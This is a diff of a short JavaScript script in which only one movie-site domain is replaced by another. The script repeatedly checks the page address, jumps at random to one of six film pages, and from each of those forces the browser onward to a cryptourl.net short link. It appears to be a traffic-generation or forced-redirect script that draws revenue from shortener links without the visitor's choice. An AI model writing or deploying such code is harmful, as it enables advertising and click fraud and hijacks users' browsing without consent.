@@ -8,56 +8,56 @@ var stop7 = false;
 var stop8 = false;
 (function() {
     setInterval(function(){
-        try{if(window.location.href == "https://all4yourlife.tech/happy-horror-days/" && stop1 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/happy-horror-days/" && stop1 == false){
             var bienso = Math.floor(Math.random() * 6);
             console.log(bienso)
             stop1 = true;
         }}catch(e){}
         try{if(bienso == 0 && stop2 == false){
-            window.location.href = "https://all4yourlife.tech/assault-on-va-33/"
+            window.location.href = "https://movieshd4.xyz/assault-on-va-33/"
             stop2 = true;
         }}catch(e){}
         try{if(bienso == 1 && stop2 == false){
-            window.location.href = "https://all4yourlife.tech/insight/"
+            window.location.href = "https://movieshd4.xyz/insight/"
             stop2 = true;
         }}catch(e){}
         try{if(bienso == 2 && stop2 == false){
-            window.location.href = "https://all4yourlife.tech/road-to-damascus/"
+            window.location.href = "https://movieshd4.xyz/road-to-damascus/"
             stop2 = true;
         }}catch(e){}
         try{if(bienso == 3 && stop2 == false){
-            window.location.href = "https://all4yourlife.tech/yes-day/"
+            window.location.href = "https://movieshd4.xyz/yes-day/"
             stop2 = true;
         }}catch(e){}
         try{if(bienso == 4 && stop2 == false){
-            window.location.href = "https://all4yourlife.tech/lily-is-here/"
+            window.location.href = "https://movieshd4.xyz/lily-is-here/"
             stop2 = true;
         }}catch(e){}
         try{if(bienso == 5 && stop2 == false){
-            window.location.href = "https://all4yourlife.tech/ghost-tale/"
+            window.location.href = "https://movieshd4.xyz/ghost-tale/"
             stop2 = true;
         }}catch(e){}
-        try{if(window.location.href == "https://all4yourlife.tech/assault-on-va-33/" && stop4 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/assault-on-va-33/" && stop4 == false){
             window.location.href = "https://cryptourl.net/hOoSeFW"
             stop4 = true;
         }}catch(e){}
-        try{if(window.location.href == "https://all4yourlife.tech/insight/" && stop4 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/insight/" && stop4 == false){
             window.location.href = "https://cryptourl.net/qlY8bt2K"
             stop4 = true;
         }}catch(e){}
-        try{if(window.location.href == "https://all4yourlife.tech/road-to-damascus/" && stop4 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/road-to-damascus/" && stop4 == false){
             window.location.href = "https://cryptourl.net/M9ke"
             stop4 = true;
         }}catch(e){}
-        try{if(window.location.href == "https://all4yourlife.tech/yes-day/" && stop4 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/yes-day/" && stop4 == false){
             window.location.href = "https://cryptourl.net/zYQEL1"
             stop4 = true;
         }}catch(e){}
-        try{if(window.location.href == "https://all4yourlife.tech/lily-is-here/" && stop4 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/lily-is-here/" && stop4 == false){
             window.location.href = "https://cryptourl.net/0Iu3Rlwu"
             stop4 = true;
         }}catch(e){}
-        try{if(window.location.href == "https://all4yourlife.tech/ghost-tale/" && stop4 == false){
+        try{if(window.location.href == "https://movieshd4.xyz/ghost-tale/" && stop4 == false){
             window.location.href = "https://cryptourl.net/ZRVADmzJ"
             stop4 = true;
         }}catch(e){}
